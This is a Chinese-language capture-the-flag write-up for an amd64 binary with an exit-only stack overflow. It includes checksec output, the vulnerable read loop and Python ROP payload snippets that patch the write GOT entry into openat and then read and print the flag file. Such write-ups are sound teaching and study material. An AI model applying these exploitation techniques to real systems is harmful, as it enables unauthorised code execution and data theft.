
## checksec

```Assembly
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Vuln

明显的栈溢出。<br>
但是问题是
```C
while ( read(0, &nptr, 0x10uLL) > 0 )
{
  v7 = atoi(&nptr);
  if ( v7 <= 15 )
    v7 = 16;
  v6 = read(0, buf, v7);
  buf[v6] = 0;
  printf("%s", buf);
}
return 0;
```
想要造成溢出，必须退出。但是退出就意味要发eof<br>
EOF是一个信号，而不是什么字符，查了一下，是要断开write的连接，对应socket的shutdown<br>
思考很久也没相到一次就溢出的方法。


## Exp

参考了http://h-noson.hatenablog.jp/entry/2017/05/22/121031<br>

### openat

方法很巧妙。<br>
程序再退出的时候<br>
```Assembly
.text:000000000040082E mov     eax, 0
.text:0000000000400833 leave
.text:0000000000400834 retn
```
观察寄存器的值可以发现
```Assembly
rdx 0000000000000010    --> arg3
rsi 00007FFEDF6A5BF0    --> arg2
rdi 0000000000000000    --> arg1
```
rsi这个时候指向栈上的某数据，调试可以发现，就是第一次read指向的地址，也就是读取size的那里(因为一定是再第一个read执行完了之后退出)<br>
再看看openat
```C
int openat(int dirfd, const char *pathname, int flags);
```
pathname就直接可以是退出之前输入的字符串了
```Python
msend_str(len(payload), payload)
time.sleep(0.05)
io.send("flag")
io.shutdown()
```
之后就发现
```
rsi --> 00007FFEDF6A5BF0  0000000067616C66  flag....
```
就下来，只要利用openat读取，然后输出。

### change func

got表显然没有openat，但是可以通过函数间的偏移<br>

```Python
# change write to openat
payload = 'a'*(0x30) + p64(0x400791)
payload += p64(pop_rdi) + p64(elf.got['write'])
payload += p64(pop_rax) + p64(0x40)
payload += p64(add_bvrdi)       # ?[write] += 0x40
payload += p64(pop_rdi) + p64(elf.got['write']+1)
payload += p64(pop_rax) + p64(0xff)
payload += p64(add_bvrdi)       # ?[write+1] += 0xff
```
每次改动一个字节即可，然后调用。<br>
> 注意的是应该先改动，调用完openat，然后再恢复write

## result

之后就简单了，读取到某个缓冲区，然后输出。<br>
python端要做的只有读取字符串了。<br>
```python
# read(3, bss, 0x100)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi_r15) + p64(bss_addr) + 'f'*0x08
payload += p64(pop_rdx) + p64(0x100)
payload += p64(elf.plt['read'])
# write(1, bss, 0x100)
payload += p64(pop_rdi) + p64(1)
payload += p64(elf.plt['write'])
```
